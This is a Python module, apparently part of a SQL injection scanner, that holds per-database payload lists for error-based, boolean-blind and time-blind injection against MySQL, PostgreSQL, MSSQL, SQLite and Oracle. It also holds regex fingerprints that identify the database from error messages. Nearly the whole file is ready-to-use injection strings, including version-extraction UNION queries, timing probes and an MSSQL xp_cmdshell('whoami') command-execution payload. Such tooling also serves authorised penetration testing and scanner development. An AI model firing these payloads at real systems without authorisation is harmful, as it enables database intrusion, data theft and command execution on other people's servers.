"""
DB-specific Payload Adapters
=============================
Provides a registry of payload families organised by target database type and
detection technique.  A lightweight fingerprinter picks the best adapter based
on error-message patterns; callers can also request a specific adapter or the
generic ``UNKNOWN`` adapter when the DBMS is not yet identified.

Classes
-------
DBType
    Enum of supported database management systems.
PayloadFamily
    Immutable container of payloads for one (DB, technique) combination.
DBAdapter
    Per-DBMS adapter exposing ``get_payloads(technique)`` and
    ``fingerprint_patterns`` for error-based DBMS detection.
AdapterRegistry
    Central registry.  Use :func:`get_adapter` to look up an adapter by
    ``DBType``, or :func:`fingerprint_from_error` to auto-detect the DBMS
    from an HTTP response body.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Sequence, Tuple


# ---------------------------------------------------------------------------
# DBType
# ---------------------------------------------------------------------------


class DBType(Enum):
    """Supported database management systems."""

    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    SQLITE = "sqlite"
    ORACLE = "oracle"
    UNKNOWN = "unknown"


# ---------------------------------------------------------------------------
# Technique names
# ---------------------------------------------------------------------------

#: Sentinel technique name for error-based probes.
TECHNIQUE_ERROR = "error"
#: Sentinel technique name for boolean-based blind probes.
TECHNIQUE_BOOLEAN = "boolean"
#: Sentinel technique name for time-based blind probes.
TECHNIQUE_TIME = "time"

KNOWN_TECHNIQUES = (TECHNIQUE_ERROR, TECHNIQUE_BOOLEAN, TECHNIQUE_TIME)


# ---------------------------------------------------------------------------
# PayloadFamily
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class PayloadFamily:
    """An ordered list of payloads for a single (DB, technique) combination.

    Attributes
    ----------
    db_type:    Target DBMS.
    technique:  Detection technique (``"error"``, ``"boolean"``, ``"time"``).
    payloads:   Ordered list of injection strings.
    """

    db_type: DBType
    technique: str
    payloads: Tuple[str, ...]

    @classmethod
    def create(cls, db_type: DBType, technique: str, payloads: Sequence[str]) -> "PayloadFamily":
        """Convenience constructor that accepts any sequence for *payloads*."""
        return cls(db_type=db_type, technique=technique, payloads=tuple(payloads))


# ---------------------------------------------------------------------------
# DBAdapter
# ---------------------------------------------------------------------------


class DBAdapter:
    """Per-DBMS adapter that exposes payload families and fingerprint patterns.

    Parameters
    ----------
    db_type:
        The DBMS this adapter serves.
    payload_map:
        Mapping of technique name → :class:`PayloadFamily`.
    fingerprint_patterns:
        List of compiled regex patterns that indicate this DBMS when matched
        against an HTTP response body (e.g. error messages).
    """

    def __init__(
        self,
        db_type: DBType,
        payload_map: Dict[str, PayloadFamily],
        fingerprint_patterns: Optional[List[re.Pattern]] = None,
    ) -> None:
        self._db_type = db_type
        self._payload_map = payload_map
        self._patterns: List[re.Pattern] = fingerprint_patterns or []

    @property
    def db_type(self) -> DBType:
        """The DBMS this adapter serves."""
        return self._db_type

    @property
    def fingerprint_patterns(self) -> List[re.Pattern]:
        """Error-message patterns used for lightweight DBMS fingerprinting."""
        return list(self._patterns)

    def get_payloads(self, technique: str) -> List[str]:
        """Return the payload list for *technique*.

        Falls back to an empty list for unknown technique names so callers
        don't need to guard against ``KeyError``.
        """
        family = self._payload_map.get(technique)
        return list(family.payloads) if family else []

    def matches_error(self, response_body: str) -> bool:
        """Return ``True`` if any fingerprint pattern matches *response_body*."""
        for pattern in self._patterns:
            if pattern.search(response_body):
                return True
        return False


# ---------------------------------------------------------------------------
# Adapter definitions
# ---------------------------------------------------------------------------

def _compile(patterns: Sequence[str]) -> List[re.Pattern]:
    return [re.compile(p, re.IGNORECASE | re.DOTALL) for p in patterns]


def _mysql_adapter() -> DBAdapter:
    return DBAdapter(
        db_type=DBType.MYSQL,
        payload_map={
            TECHNIQUE_ERROR: PayloadFamily.create(DBType.MYSQL, TECHNIQUE_ERROR, [
                "'",
                "\"",
                "' OR '1'='1'--",
                "\" OR \"1\"=\"1\"--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x"
                " FROM information_schema.tables GROUP BY x)a)--",
                "') OR ('1'='1",
                "1' AND 1=2 UNION SELECT 1,@@version--",
            ]),
            TECHNIQUE_BOOLEAN: PayloadFamily.create(DBType.MYSQL, TECHNIQUE_BOOLEAN, [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND '1'='1",
                "' AND '1'='2",
                "1 AND 1=1",
                "1 AND 1=2",
                "' OR 1=1--",
                "' OR 1=2--",
                "' AND LENGTH(database())>0--",
                "' AND LENGTH(database())>99--",
            ]),
            TECHNIQUE_TIME: PayloadFamily.create(DBType.MYSQL, TECHNIQUE_TIME, [
                "' AND SLEEP(5)--",
                "\" AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "1' AND SLEEP(5)--",
                "'; SELECT SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT SLEEP(5)) t)--",
            ]),
        },
        fingerprint_patterns=_compile([
            r"You have an error in your SQL syntax.*MySQL",
            r"mysql_fetch",
            r"MySQL server version",
            r"com\.mysql\.jdbc",
            r"Unclosed quotation mark.*MySQL",
            r"check the manual that corresponds to your MySQL server",
        ]),
    )


def _postgresql_adapter() -> DBAdapter:
    return DBAdapter(
        db_type=DBType.POSTGRESQL,
        payload_map={
            TECHNIQUE_ERROR: PayloadFamily.create(DBType.POSTGRESQL, TECHNIQUE_ERROR, [
                "'",
                "\"",
                "' OR '1'='1'--",
                "' AND 1=CAST((SELECT version()) AS int)--",
                "'; SELECT pg_sleep(0)--",
                "' AND 1=(SELECT CAST(version() AS integer))--",
                "' UNION SELECT NULL,version(),NULL--",
            ]),
            TECHNIQUE_BOOLEAN: PayloadFamily.create(DBType.POSTGRESQL, TECHNIQUE_BOOLEAN, [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a",
                "' AND 'a'='b",
                "' AND (SELECT 1)=1--",
                "' AND (SELECT 1)=2--",
                "' OR TRUE--",
                "' OR FALSE--",
            ]),
            TECHNIQUE_TIME: PayloadFamily.create(DBType.POSTGRESQL, TECHNIQUE_TIME, [
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT pg_sleep(5))--",
                "' OR (SELECT pg_sleep(5))--",
                "1; SELECT pg_sleep(5)--",
                "'; SELECT 1 FROM pg_sleep(5)--",
            ]),
        },
        fingerprint_patterns=_compile([
            r"pg_query\(\)",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_exec",
            r"ERROR.*syntax error at or near",
            r"org\.postgresql",
            r"PSQLException",
        ]),
    )


def _mssql_adapter() -> DBAdapter:
    return DBAdapter(
        db_type=DBType.MSSQL,
        payload_map={
            TECHNIQUE_ERROR: PayloadFamily.create(DBType.MSSQL, TECHNIQUE_ERROR, [
                "'",
                "\"",
                "' OR '1'='1'--",
                "'; EXEC xp_cmdshell('whoami')--",
                "' UNION SELECT NULL,@@version,NULL--",
                "' AND 1=CONVERT(int,@@version)--",
                "' OR 1=1--",
            ]),
            TECHNIQUE_BOOLEAN: PayloadFamily.create(DBType.MSSQL, TECHNIQUE_BOOLEAN, [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a'--",
                "' AND 'a'='b'--",
                "1 AND 1=1--",
                "1 AND 1=2--",
                "' OR 1=1--",
                "' OR 1=2--",
            ]),
            TECHNIQUE_TIME: PayloadFamily.create(DBType.MSSQL, TECHNIQUE_TIME, [
                "'; WAITFOR DELAY '0:0:5'--",
                "' WAITFOR DELAY '0:0:5'--",
                "'; IF 1=1 WAITFOR DELAY '0:0:5'--",
                "' AND 1=1 WAITFOR DELAY '0:0:5'--",
                "1; WAITFOR DELAY '0:0:5'--",
            ]),
        },
        fingerprint_patterns=_compile([
            r"Microsoft OLE DB Provider for SQL Server",
            r"Unclosed quotation mark after the character string",
            r"Microsoft SQL Server",
            r"\[SQL Server\]",
            r"SqlException",
            r"com\.microsoft\.sqlserver",
        ]),
    )


def _sqlite_adapter() -> DBAdapter:
    return DBAdapter(
        db_type=DBType.SQLITE,
        payload_map={
            TECHNIQUE_ERROR: PayloadFamily.create(DBType.SQLITE, TECHNIQUE_ERROR, [
                "'",
                "\"",
                "' OR '1'='1",
                "' UNION SELECT NULL,sqlite_version(),NULL--",
                "' AND 1=CAST(sqlite_version() AS integer)--",
                "'; SELECT * FROM sqlite_master--",
            ]),
            TECHNIQUE_BOOLEAN: PayloadFamily.create(DBType.SQLITE, TECHNIQUE_BOOLEAN, [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a'--",
                "' AND 'a'='b'--",
                "' OR 1=1--",
                "' OR 1=2--",
            ]),
            TECHNIQUE_TIME: PayloadFamily.create(DBType.SQLITE, TECHNIQUE_TIME, [
                # SQLite has no sleep function; use heavy computation instead
                "' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master)>0--",
                "' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b)>0--",
            ]),
        },
        fingerprint_patterns=_compile([
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite",
            r"unrecognized token:",
            r"sqlite3_exec",
        ]),
    )


def _oracle_adapter() -> DBAdapter:
    return DBAdapter(
        db_type=DBType.ORACLE,
        payload_map={
            TECHNIQUE_ERROR: PayloadFamily.create(DBType.ORACLE, TECHNIQUE_ERROR, [
                "'",
                "\"",
                "' OR '1'='1",
                "' UNION SELECT NULL,banner,NULL FROM v$version--",
                "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
                "' UNION SELECT NULL,NULL FROM dual--",
            ]),
            TECHNIQUE_BOOLEAN: PayloadFamily.create(DBType.ORACLE, TECHNIQUE_BOOLEAN, [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 1=1 FROM dual--",
                "' AND 1=2 FROM dual--",
                "' OR 1=1--",
                "' OR 1=2--",
            ]),
            TECHNIQUE_TIME: PayloadFamily.create(DBType.ORACLE, TECHNIQUE_TIME, [
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--",
                "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--",
                "'; EXECUTE DBMS_LOCK.SLEEP(5)--",
                "' AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('t',5)=1)--",
            ]),
        },
        fingerprint_patterns=_compile([
            r"ORA-\d{5}",
            r"Oracle error",
            r"oracle\.jdbc",
            r"OracleException",
            r"quoted string not properly terminated",
            r"missing right parenthesis.*Oracle",
        ]),
    )


def _unknown_adapter() -> DBAdapter:
    """Generic adapter used when the DBMS is not (yet) identified."""
    return DBAdapter(
        db_type=DBType.UNKNOWN,
        payload_map={
            TECHNIQUE_ERROR: PayloadFamily.create(DBType.UNKNOWN, TECHNIQUE_ERROR, [
                "'",
                "\"",
                "' OR '1'='1'--",
                "\" OR \"1\"=\"1\"--",
                "') OR ('1'='1",
                "\") OR (\"1\"=\"1",
                "' OR 1=1--",
            ]),
            TECHNIQUE_BOOLEAN: PayloadFamily.create(DBType.UNKNOWN, TECHNIQUE_BOOLEAN, [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a'--",
                "' AND 'a'='b'--",
                "1 AND 1=1",
                "1 AND 1=2",
            ]),
            TECHNIQUE_TIME: PayloadFamily.create(DBType.UNKNOWN, TECHNIQUE_TIME, [
                "' AND SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('t',5)=1--",
            ]),
        },
        fingerprint_patterns=[],
    )


# ---------------------------------------------------------------------------
# AdapterRegistry
# ---------------------------------------------------------------------------


class AdapterRegistry:
    """Central registry of :class:`DBAdapter` instances.

    Usage::

        registry = AdapterRegistry()
        adapter = registry.get_adapter(DBType.MYSQL)
        payloads = adapter.get_payloads("boolean")

        # Auto-detect DBMS from error response:
        db_type, adapter = registry.fingerprint_from_error(response_body)
    """

    def __init__(self) -> None:
        self._adapters: Dict[DBType, DBAdapter] = {
            DBType.MYSQL: _mysql_adapter(),
            DBType.POSTGRESQL: _postgresql_adapter(),
            DBType.MSSQL: _mssql_adapter(),
            DBType.SQLITE: _sqlite_adapter(),
            DBType.ORACLE: _oracle_adapter(),
            DBType.UNKNOWN: _unknown_adapter(),
        }

    def get_adapter(self, db_type: DBType) -> DBAdapter:
        """Return the adapter for *db_type*.

        Falls back to the ``UNKNOWN`` adapter if *db_type* is not registered.
        """
        return self._adapters.get(db_type, self._adapters[DBType.UNKNOWN])

    def fingerprint_from_error(self, response_body: str) -> Tuple[DBType, DBAdapter]:
        """Attempt lightweight DBMS fingerprinting from *response_body*.

        Iterates over all adapters (excluding ``UNKNOWN``) and returns the
        first matching ``(DBType, DBAdapter)`` pair.  Falls back to
        ``(DBType.UNKNOWN, unknown_adapter)`` when no patterns match.

        Parameters
        ----------
        response_body:
            The raw (or normalised) HTTP response body to search.

        Returns
        -------
        ``(DBType, DBAdapter)``
        """
        for db_type, adapter in self._adapters.items():
            if db_type is DBType.UNKNOWN:
                continue
            if adapter.matches_error(response_body):
                return db_type, adapter
        return DBType.UNKNOWN, self._adapters[DBType.UNKNOWN]

    def all_db_types(self) -> List[DBType]:
        """Return all registered DB types."""
        return list(self._adapters.keys())


# ---------------------------------------------------------------------------
# Module-level convenience instance and helpers
# ---------------------------------------------------------------------------

#: Default registry instance — re-use across the codebase.
_default_registry = AdapterRegistry()


def get_adapter(db_type: DBType) -> DBAdapter:
    """Return the adapter for *db_type* from the default registry."""
    return _default_registry.get_adapter(db_type)


def fingerprint_from_error(response_body: str) -> Tuple[DBType, DBAdapter]:
    """Auto-detect DBMS from *response_body* using the default registry."""
    return _default_registry.fingerprint_from_error(response_body)
